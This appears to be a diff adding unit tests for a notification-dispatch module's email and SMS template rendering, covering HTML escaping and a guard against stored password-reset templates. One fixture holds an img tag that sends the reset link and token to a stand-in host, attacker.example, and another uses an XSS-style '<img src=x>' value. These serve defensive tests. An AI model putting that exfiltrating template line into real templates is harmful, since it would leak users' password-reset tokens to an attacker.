@@ -85,6 +85,12 @@ describe('notification-dispatch', () => {
       expect(result).toBe('<div>TestCo: <p>Hello</p></div>');
     });
 
+    it('keeps only {{{content}}} raw in a custom layout', async () => {
+      const { wrapEmailHtml } = notificationDispatchModule;
+      const result = wrapEmailHtml('<p>Hello</p>', '<b>Co</b>', '{{{companyName}}}{{{content}}}');
+      expect(result).toBe('&lt;b&gt;Co&lt;/b&gt;<p>Hello</p>');
+    });
+
     it('falls back to default template when custom is empty', async () => {
       const { wrapEmailHtml } = notificationDispatchModule;
       const result = wrapEmailHtml('<p>Hello</p>', 'TestCo', '');
@@ -248,6 +254,25 @@ describe('notification-dispatch', () => {
       expect(result.html).toBe('<p>Override TestCo</p>');
     });
 
+    it('escapes a raw variable of a stored email body, but not of an SMS', async () => {
+      const { renderTemplate } = notificationDispatchModule;
+      const vars = { firstName: '<img src=x>' };
+      setupSqlResults([{ subject: '{{{firstName}}}', body_html: '<p>Hi {{{firstName}}}</p>' }]);
+      const email = await renderTemplate('email', 'test.event', 'en', vars, sql as never);
+      expect(email.html).toBe('<p>Hi &lt;img src&#x3D;x&gt;</p>');
+      // The subject is plain text: never escaped.
+      expect(email.subject).toBe('<img src=x>');
+      const sms = await renderTemplate(
+        'sms',
+        'test.event',
+        'en',
+        vars,
+        undefined,
+        'Hi {{{firstName}}}',
+      );
+      expect(sms.body).toBe('Hi <img src=x>');
+    });
+
     it('falls back to JSON dump when no templates available', async () => {
       const { renderTemplate } = notificationDispatchModule;
       const result = await renderTemplate('email', 'test.event', 'en', {
@@ -270,6 +295,50 @@ describe('notification-dispatch', () => {
       expect(result.subject).toBe('DB Subject');
       expect(result.body).toBe('<p>DB Body TestCo</p>');
       expect(result.html).toBe('<p>DB Body TestCo</p>');
+    });
+
+    it('sends the shipped file instead of a stored reset template that leaks the link', async () => {
+      const { renderTemplate } = notificationDispatchModule;
+      const { readFile } = await import('node:fs/promises');
+      vi.mocked(readFile).mockImplementation((path) =>
+        typeof path === 'string' && path.endsWith('/en/operator/ForgotPassword/email.hbs')
+          ? Promise.resolve('<p><a href="{{resetUrl}}">Shipped reset</a></p>')
+          : Promise.reject(new Error('ENOENT')),
+      );
+      const vars = { resetUrl: 'https://csms.example.com/reset-password?token=t1' };
+      setupSqlResults([
+        {
+          subject: null,
+          body_html:
+            '<a href="{{resetUrl}}">x</a><img src="https://attacker.example/?u={{resetUrl}}">',
+        },
+      ]);
+      const leaked = await renderTemplate(
+        'email',
+        'operator.ForgotPassword',
+        'en',
+        vars,
+        sql as never,
+        undefined,
+        '/templates',
+      );
+      expect(leaked.html).toContain('Shipped reset');
+      expect(leaked.html).not.toContain('attacker.example');
+
+      setupSqlResults([
+        { subject: null, body_html: '<p><a href="{{resetUrl}}">Custom reset</a></p>' },
+      ]);
+      const kept = await renderTemplate(
+        'email',
+        'operator.ForgotPassword',
+        'en',
+        vars,
+        sql as never,
+        undefined,
+        '/templates',
+      );
+      expect(kept.html).toContain('Custom reset');
+      vi.mocked(readFile).mockRejectedValue(new Error('ENOENT'));
     });
 
     it('falls back to English DB template when language not found', async () => {
